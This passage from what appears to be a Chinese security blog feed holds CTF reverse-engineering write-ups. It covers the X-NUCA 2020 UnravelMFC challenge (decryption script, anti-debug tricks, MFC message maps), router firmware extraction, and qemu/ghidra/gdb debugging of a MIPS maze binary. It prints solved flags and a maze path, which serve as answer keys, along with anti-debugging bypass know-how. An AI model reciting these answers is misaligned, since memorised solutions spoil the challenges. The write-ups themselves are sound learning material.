class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a[] = &#123;<span class="number">0x67616c66</span>, <span class="number">0x6330447b</span>, <span class="number">0x37306261</span>,<span class="number">0x35346146</span>, <span class="number">0x36623241</span>,</span><br><span class="line"><span class="number">0x62376646</span>, <span class="number">0x41364541</span>, <span class="number">0x41624261</span>, <span class="number">0x64354635</span>,</span><br><span class="line"><span class="number">0x43336263</span>, <span class="number">0x43446639</span>, <span class="number">0x66613545</span>, <span class="number">0x34354665</span>,</span><br><span class="line"><span class="number">0x38434144</span>, <span class="number">0x30354138</span>, <span class="number">0x7d413339</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, *(((<span class="keyword">char</span> *)&amp;a[i])+j));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;D0cab07Fa45A2b6Ff7bAE6AaBbA5F5dcb3C9fDCE5afeF54DAC88A5093A&#125;</span></span><br></pre></td></tr></table></figure><p>其中是sub_11E40这个函数对程序流程进行了一些骚操作，好像是hook。</p><p>ps：后面看别人的wp学习我才知道自己逆向的这个算法是一个魔改的tea，然后那个骚操作是hook了程序的memcmp函数。</p><h1 id="UnravelMFC"><a href="#UnravelMFC" class="headerlink" title="UnravelMFC"></a>UnravelMFC</h1><p>这个题对于我我现在的知识储备感觉考的东西还是挺多的。</p><p>首先算法：RC4，base64的简单改动，改了delta的tea。</p><p>然后说说程序的一些坑，开始使用如下的函数执行一个函数指针数组的所有函数，里面包括了smc，变换数据，和反调试检测(简单的<strong>*(_BYTE *)(__readfsdword(0x30u) + 2)</strong>）：</p><p><img src="/2020/10/31/X-nuca-2020/image-20201212112326826.png" alt="image-20201212112326826"></p><p>另外就是一个反调试我找了好久，一度怀疑是ida版本的bug，每次调试到一个地方就闪退，一直跟最后跟到库里的一个创建窗口函数，然后就退出了，但为什么呢。。后面才发现是在一个函数初始化窗口时的函数用了<strong>*(_BYTE *)(__readfsdword(0x30u) + 2)</strong>检测调试，如果处于调试状态就不会初始化这个窗口了，然后调用ExitProcess退出程序。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213155507714.png" alt="image-20201213155507714"></p><p>从这个函数向上找调用：可以看到消息值0x110，一些<strong>RegisterWindowsMessageW</strong>函数后出现对话框过程处理函数（DialogFunc）。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213160502370.png" alt="image-20201213160502370"></p><p><img src="/2020/10/31/X-nuca-2020/image-20201213155933860.png" alt="image-20201213155933860"></p><p>此时我又想到正在做的另外一个MFC程序，那找主要的对话框初始化函数是不是也可以找呢，试了一下：确实可行。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213161554990.png" alt="image-20201213161554990"></p><p>接着上面那个用函数指针调用的函数：一个简单的反调试，虽然简单，但感觉不好发现。。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201212114250004.png" alt="image-20201212114250004"></p><p><img src="/2020/10/31/X-nuca-2020/image-20201212114424506.png" alt="image-20201212114424506"></p><p>上面说到那个反调试不好发现，但其实有一个查程序退出原因的办法，那就是不断跟踪：下面是退出前我跟到的一个API：</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213163744884.png" alt="image-20201213163744884"></p><p><a href="https://www.gladir.com/CODER/CWINDOWS/createdialogindirectparamw.htm" target="_blank" rel="noopener">函数解释</a>，其实这个函数就类似DialogBoxParamA()函数，用对话框的模板创建模态对话框。而窗口过程函数指针在第四个参数。。这也是我们关心的关键函数，下个断点。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213163854906.png" alt="image-20201213163854906"></p><p>然后就是为什么程序要输入字符长度为66才会enable确定按钮，但为什么只能输入63个字符呢，，这也是我在做题时一直想的问题，然后当时也就不想逆下去了。</p><p>而当我在输入框输入正确的flag时这个输入长度又可以是66，难道还有检查机制。。找了半天没有找到，后面发现是那个文本框是根据我输入的字符宽度来决定能输入多少内容。。。因为比赛时我输入的全是1，而字符1比较宽，这里输入全是i的话能容纳的就多了。这应该是设置了输入框的一个属性吧。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201212115832156.png" alt="image-20201212115832156"></p><p>剩下对于程序的就是mfc消息对应的处理函数的学习。然后逆向2部分解密。</p><p>这里只说一下我在python逆tea加密时遇到的坑，因为python不像C语言，int型数据的话就固定是4个字节，python就是作为一个大数处理，所以每次的数据我们都要<strong>&amp;0xffffffff</strong>取低4字节数据。</p><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">v13, v16, v17 = BitVecs(<span class="string">'v13 v16 v17'</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v14 = <span class="number">0x2F9970FF</span></span><br><span class="line">v15 = <span class="number">0xDF3634AE</span></span><br><span class="line">s.add(v16 - v13 == <span class="number">0x3F66B755B4490579</span>)</span><br><span class="line">s.add(v13 + v17 == <span class="number">0x162F924623D2CAE0</span>)</span><br><span class="line">s.add(v17 - v16 == <span class="number">0x7C3C71F1B295D77F</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v13, v16, v17:</span><br><span class="line">print(hex(s.model()[i].as_long()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">'usat'</span>)</span><br><span class="line"></span><br><span class="line">enc2 = [<span class="number">0x2d46347f</span>, <span class="number">0x5e79f6f4</span>, <span class="number">0xDF3634AE</span>, <span class="number">0x2F9970FF</span>, <span class="number">0x6cacebd5</span>, <span class="number">0x12c2fc6d</span>, <span class="number">0xe8e95dc6</span>, <span class="number">0xc558d3ec</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">def delta():</span></span><br><span class="line"><span class="string">a = 0</span></span><br><span class="line"><span class="string">for i in range(32):</span></span><br><span class="line"><span class="string">a += 0x2433B95A</span></span><br><span class="line"><span class="string">a &amp;= 0xffffffff</span></span><br><span class="line"><span class="string">return a</span></span><br><span class="line"><span class="string">print(hex(delta()))</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x0D9610D02</span>, <span class="number">0x2AADA57D</span>, <span class="number">0x0A37537F1</span>, <span class="number">0x0C29E3913</span>, <span class="number">0x0D5942CE8</span>, <span class="number">0x608CCE66</span>, <span class="number">0x6D593422</span>, <span class="number">0x21E5D6F2</span>, <span class="number">0x0ED3A9235</span>, <span class="number">0x9DAD62C4</span>, <span class="number">0x3856641B</span>, <span class="number">0x71F75B9D</span>, <span class="number">0x0DCDEDAE8</span>, <span class="number">0x0EAD2D1A0</span>, <span class="number">0x0BAC4F564</span>, <span class="number">0x0DA4772AC</span>]</span><br><span class="line">enc1 = [<span class="number">36</span>,  <span class="number">72</span>,  <span class="number">77</span>,  <span class="number">37</span>,  <span class="number">47</span>,  <span class="number">78</span>,  <span class="number">69</span>,  <span class="number">88</span>,  <span class="number">44</span>,  <span class="number">55</span>, </span><br><span class="line">   <span class="number">57</span>,  <span class="number">80</span>,  <span class="number">66</span>,  <span class="number">78</span>,  <span class="number">92</span>,  <span class="number">67</span>,  <span class="number">47</span>,  <span class="number">66</span>,  <span class="number">81</span>,  <span class="number">76</span>, </span><br><span class="line">   <span class="number">86</span>,  <span class="number">83</span>,  <span class="number">87</span>,  <span class="number">44</span>,  <span class="number">42</span>,  <span class="number">47</span>,  <span class="number">39</span>,  <span class="number">56</span>,  <span class="number">84</span>,  <span class="number">35</span>, </span><br><span class="line">   <span class="number">85</span>,  <span class="number">77</span>,  <span class="number">67</span>,  <span class="number">52</span>,  <span class="number">37</span>,  <span class="number">69</span>,  <span class="number">71</span>,  <span class="number">64</span>,  <span class="number">64</span>,  <span class="number">64</span>, </span><br><span class="line">   <span class="number">44</span>,  <span class="number">46</span>,  <span class="number">37</span>,  <span class="number">53</span>]</span><br><span class="line">in_put = <span class="string">'asfa2asf1asfsa13asfsfasasfas313ssljlslgjlasjlsagljlagaaslagsafsasa'</span></span><br><span class="line">a = [<span class="number">0x21</span>, <span class="number">0x5B</span>, <span class="number">0xD0</span>, <span class="number">0x3D</span>, <span class="number">0xE1</span>, <span class="number">0xE5</span>, <span class="number">0x2F</span>, <span class="number">0x7C</span>, <span class="number">0xD1</span>, <span class="number">0x79</span>, </span><br><span class="line"><span class="number">0x8E</span>, <span class="number">0x59</span>, <span class="number">0x2E</span>, <span class="number">0xAF</span>, <span class="number">0xC7</span>, <span class="number">0x88</span>, <span class="number">0x5C</span>, <span class="number">0x35</span>, <span class="number">0x25</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0x1C</span>, <span class="number">0xC8</span>, <span class="number">0x2F</span>, <span class="number">0x82</span>, <span class="number">0x97</span>, <span class="number">0x2E</span>, <span class="number">0x9C</span>, <span class="number">0xD6</span>, <span class="number">0x8A</span>, <span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x48</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>]</span><br><span class="line">xor = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>):</span><br><span class="line">xor += [ord(in_put[i])^a[i]]</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------1--------------------</span></span><br><span class="line">base = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc1)):</span><br><span class="line">enc1[i] -= <span class="number">35</span></span><br><span class="line">flag1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc1:</span><br><span class="line">flag1 += base[i]</span><br><span class="line">flag1 = base64.b64decode(flag1.encode())</span><br><span class="line">flag1 = list(flag1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag1)):</span><br><span class="line">flag1[i] ^= xor[i]</span><br><span class="line">flag1 = <span class="string">''</span>.join(map(chr, flag1))</span><br><span class="line">print(flag1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------2--------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de_tea</span><span class="params">(a, b, key)</span>:</span></span><br><span class="line">sum = <span class="number">0x86772b40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">b -= (a+sum) ^ ((a&lt;&lt;<span class="number">4</span>)+key[<span class="number">2</span>]) ^ ((a&gt;&gt;<span class="number">5</span>)+key[<span class="number">3</span>])</span><br><span class="line">b &amp;= <span class="number">0xffffffff</span></span><br><span class="line">a -= (b+sum) ^ ((b&lt;&lt;<span class="number">4</span>)+key[<span class="number">0</span>]) ^ ((b&gt;&gt;<span class="number">5</span>)+key[<span class="number">1</span>])</span><br><span class="line">a &amp;= <span class="number">0xffffffff</span></span><br><span class="line">sum -= <span class="number">0x2433B95A</span></span><br><span class="line">sum &amp;= <span class="number">0xffffffff</span></span><br><span class="line"><span class="keyword">return</span> [a, b]</span><br><span class="line">   </span><br><span class="line">ans = []</span><br><span class="line">flag2 = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc2), <span class="number">2</span>):</span><br><span class="line">ans += de_tea(enc2[i], enc2[i+<span class="number">1</span>], key[<span class="number">4</span>*(i//<span class="number">2</span>):])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">flag2 += long_to_bytes(i)[::<span class="number">-1</span>]</span><br><span class="line">print(flag2)</span><br><span class="line">print(flag1+<span class="string">'f'</span>+flag2.decode())</span><br></pre></td></tr></table></figure><p>最后消息映射表的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP</span>&#123;</span></span><br><span class="line">    AFX_MSGMAP * pBaseMessageMap;</span><br><span class="line">    AFX_MSGMAP_ENTRY * lpEntries;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP_ENTRY</span>&#123;</span></span><br><span class="line">    UINT nMessage;    <span class="comment">//Windows Message</span></span><br><span class="line">    UINT nCode        <span class="comment">//Control code or WM_NOTIFY code</span></span><br><span class="line">    UINT nID;         <span class="comment">//control ID (or 0 for windows messages)</span></span><br><span class="line">    UINT nLastID;     <span class="comment">//used for entries specifying a range of control id's</span></span><br><span class="line">    UINT nSig;        <span class="comment">//signature type(action) or pointer to message </span></span><br><span class="line">    AFX_PMSG pfn;     <span class="comment">//routine to call (or specical value)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从一道CTF题简单接触路由器逆向</title>
      <link href="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/"/>
      <url>/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<blockquote><p>关键遇到一个由于Glibc版本变化出现的问题，花了些时间解决。。<a id="more"></a></p></blockquote><p>首先是对路由器文件系统的学习，看了一篇文章，这里直接贴上：<a href="https://www.cnblogs.com/blacksunny/p/7208451.html" target="_blank" rel="noopener">路由器文件系统与提取</a></p><p>然后这个CTF题来自BUU：<strong>firmware</strong></p><p>下载后得到一个bin文件，file一下：<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004180937146.png" alt="image-20201004180937146"></p><p>从最上面的文章可以知道这是固件里的bin文件分析。</p><p>首先使用binwalk 提取出，得到一个Squashfs 文件系统的文件：<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004181455157.png" alt="image-20201004181455157"></p><p>对于Squashfs 文件系统的文件，我们要使用firmware-mod-kit工具来进行解压。<a href="https://blog.csdn.net/ldwj2016/article/details/80712566" target="_blank" rel="noopener">fiemware-mod-kit工具的安装</a></p><p>遇到的问题来了。跟着安装前置的文件后，在<strong>执行configure文件生成Makefile文件然后make编译生成可执行文件</strong>发生了问题：<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004182128948.png" alt="image-20201004182128948"></p><p>其实上面的也有很多warning，但都能通过的，找了一篇文章了解原因，<a href="https://blog.csdn.net/baidu_35679960/article/details/78984497" target="_blank" rel="noopener">C语言中函数不声明也能使用</a></p><blockquote><p><strong>在函数声明方面C和C++则不同，C++语言中，在被调用之前未声明或定义是不允许的，而C语言是允许的。</strong></p></blockquote><p>然后就是出现error的原因寻找。。</p><p>最开始没仔细看出错原因，直接把一大段错误google和百度，但发现大家都没有出现这样的问题。。找了很久。。</p><p>然后开始仔细看出错的原因，即上面画红线的语句。最开始对<strong>collect2：error：ld return 1 exit status</strong>进行了搜索。找到解释：<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004182839147.png" alt="image-20201004182839147"></p><p>意思就是：上面的undefined reference to — 导致出错。而<strong>undefined reference to —</strong> 出错的原因是我们在程序中使用了未定义的函数。</p><p>现在error原因清晰多了，google也更目标化了。然后找到了最终原因：<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004183233667.png" alt="image-20201004183233667"></p><p>最后找到所有要编译的文件添加上：<strong>#include &lt;sys/sysmacros.h&gt;</strong>即可。</p><p>准备工作完成，开始对Squashfs 文件系统文件解压：</p><p>在firmware/firmware-mod-kit目录下，使用<strong>./unsquashfs_all.sh 需要解压文件的目录</strong>：<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004183726652.png" alt="image-20201004183726652"></p><p>最后在解压得到文件目录：<strong>squashfs-root/tmp</strong>下得到我们想要的backdoor程序。然后脱壳，找string。</p><p><strong>本文更多的是对自己解决问题一步一步的记录，也是路由器逆向的简单学习。</strong></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>iot&amp;mips程序动调&amp;qemu学习&amp;ghidra</title>
      <link href="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/"/>
      <url>/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/</url>
      
        <content type="html"><![CDATA[<blockquote><p>吾爱师傅发了一篇关于mips程序的逆向，刚接触逆向遇到过但都跳过了，这次遇到正好趁此学习一下。</p></blockquote><a id="more"></a><h2 id="qemu的了解与ghidra"><a href="#qemu的了解与ghidra" class="headerlink" title="qemu的了解与ghidra"></a>qemu的了解与ghidra</h2><p>以该师傅发的iot逆向题目来学习。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919100306144.png" alt="image-20200919100306144">下载后有3个文件，其中一个是提示：</p><blockquote><p><strong>题目运行命令如下:</strong><br><strong>sudo qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append “root=/dev/sda console=tty50”</strong> </p><p><strong>需要分析的程序为 ./bin/maze</strong></p></blockquote><p>了解下qemu：</p><blockquote><p>Qemu  是<strong>纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备</strong>，我们最熟悉的就是能够模拟一台能够独立运行操作系统的虚拟机，虚拟机认为自己和硬件打交道，但其实是和 Qemu 模拟出来的硬件打交道，Qemu 将这些指令转译给真正的硬件。</p></blockquote><p>其实就是qemu可以模拟一些对应程序需要环境来让执行对应的程序。</p><p>经过一番理解后，其实就是使用qemu利用所给的2个文件来模拟openwrt系统来运行，我们知道linux的每个命令都是一个二进制文件，而我们要分析的maze文件也在该命令文件夹中（bin）。</p><p>由于.ext4文件是可以直接解压的，首先将其解压后得到要分析的maze文件。</p><p>查看一下文件信息：32为小端mips的动态链接程序。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919001345047.png" alt="image-20200919001345047"></p><p>执行一下看，发现不能执行，因为这个mips框架的，查资料才知道可以使用qemu来模拟mips环境来执行mips程序。</p><p>题目有提示的，在上面告诉了我们<strong>题目运行命令</strong>：</p><p>所以首先我们是要安装qemu的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br></pre></td></tr></table></figure><p>然后进入该模拟的openwrt系统，简单执行一下maze程序，可以看见，还可以进行gdb调试。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200918235617145.png" alt="image-20200918235617145"></p><p>由于ida7.5以下且不使用<code>retdec</code>插件是不能反编译mips框架程序的，知道可以使用ghidra。下载后，找了一个教程学习了下，<a href="https://bbs.pediy.com/thread-251204.htm" target="_blank" rel="noopener">Ghidra使用</a>，其实和ida也总体差不多，上手会很快，但没有ida那么方便。</p><p>由于以前学习java安装过jdk且配置了环境变量，下载该程序后可以直接使用很方便。载入程序：<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919002432181.png" alt="image-20200919002432181"></p><p>文件名都是maze（迷宫），且通过伪代码可以很快看清程序流程，这道题也是maze的老套路了，首先生成一个表，然后通过指定字符（U D L R）控制走向，到达一个目的地。</p><p>这里可以通过伪代码计算出该表，但可以直接通过模拟的openwrt系统gdb调试，就调试好了。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003129670.png" alt="image-20200919003129670"></p><p>然后dump出数据：<strong>dump binary memroy dump.txt 0x4110d0 0x411147</strong><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003201998.png" alt="image-20200919003201998"></p><p>C语言按15*8打印一下：</p><p><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003349559.png" alt="image-20200919003349559"></p><p>最后走一下得结果：DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003440203.png" alt="image-20200919003440203"></p><h2 id="mips程序的ida动调与gdb调试"><a href="#mips程序的ida动调与gdb调试" class="headerlink" title="mips程序的ida动调与gdb调试"></a>mips程序的ida动调与gdb调试</h2><p>当然到这里肯定是不够的，万一程序没有给能能让该mips程序运行的文件系统，那我们还是自己想办法让程序运行起来进而动调。</p><p>在上面为了模拟openwrt系统运行，已经安装了qemu-user。这时候静态链接的mips程序我们是可以直接执行了，但一般的程序的程序都是动态链接的，我们只要安装好<strong>对应的架构程序的共享库</strong>就好了。<a href="https://www.cnblogs.com/WangAoBo/p/debug-arm-mips-on-linux.html" target="_blank" rel="noopener">学习安装的文章</a></p><p>首先搜索相关库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search <span class="string">"libc6"</span> | grep mips</span><br></pre></td></tr></table></figure><p><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919101836969.png" alt="image-20200919101836969"></p><p>这里我们安装程序需要的就行。我为了以后方便将64位与32位的大小端mips程序的共享库都装了：<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919102119629.png" alt="image-20200919102119629"></p><p>然后运行动态链接的程序要使用完整的命令且指明共享库路径：<strong>-L 指明共享库路径</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -L /usr/mipsel-linux-gnu/ ./maze</span><br></pre></td></tr></table></figure><p>但这道题的maze却运行不了，提示：<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919102554822.png" alt="image-20200919102554822"></p><p>可以看到，他提示/bin/ld-musl-mipsel-sf.so.1不存在。而这是一个绝对路径，而题目给了文件系统的。所以找到之前解压的.ext4文件，果然才/bin/目录下发现ld-musl-mips-sf.so.1。所以这个的mips的程序应该是指定了共享库的路径了，我们安装32位小端共享库自然不行。</p><p>所以本题的程序要利用所给的共享库，接下来把lib文件夹放在与maze同一级的目录下，然后执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -L ./ ./maze</span><br></pre></td></tr></table></figure><p>还是报错。。但这次是共享库存在了。。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919103541134.png" alt="image-20200919103541134"></p><p>最后在看发这个题的师傅的帖子里看到一个方法：也就是我上面执行失败的解决办法。</p><p>找到/lib/下的2个文件：<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919104238399.png" alt="image-20200919104238399"></p><p>我的理解是像链表一样通过一个文件找到一个文件。这样会导致我们在所给系统外执行该程序，解析失败。解决办法：</p><p>直接删除原文件，将所指的2个文件，重命名为指向他们文件的名称。<strong>也就是ld-musl-mipsel-sf.so.1删除，libc.so重名为ld-musl-mipsel-sf.so.1，另外一个文件同然的操作。</strong></p><p>然后执行成功。<strong>当然对于直接给的一个mips程序，我们用指定的qemu命令并指明共享库就可以执行的了。要是其他架构的程序使用相应的命令即可</strong></p><p>为了调试，我们指定某一个端口开一个GDB调试（-g port）。</p><p>因为以前ida动调端口号都是23946，这里为了ida动调方便也用这个。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919105704723.png" alt="image-20200919105704723"></p><p>现在我们就可以开始调试了，使用gdb与ida都可以。</p><p>首先gdb：</p><ol><li>安装<strong>apt-get install gdb-multiarch</strong></li><li><strong>gdb-multiarch -q ./bin/maze</strong></li><li><strong>set architecture mips</strong>（设置好调试程序的架构）</li><li><strong>set endian little</strong>（设置程序的大小端）</li><li>远程连接调试端口 <strong>target remote 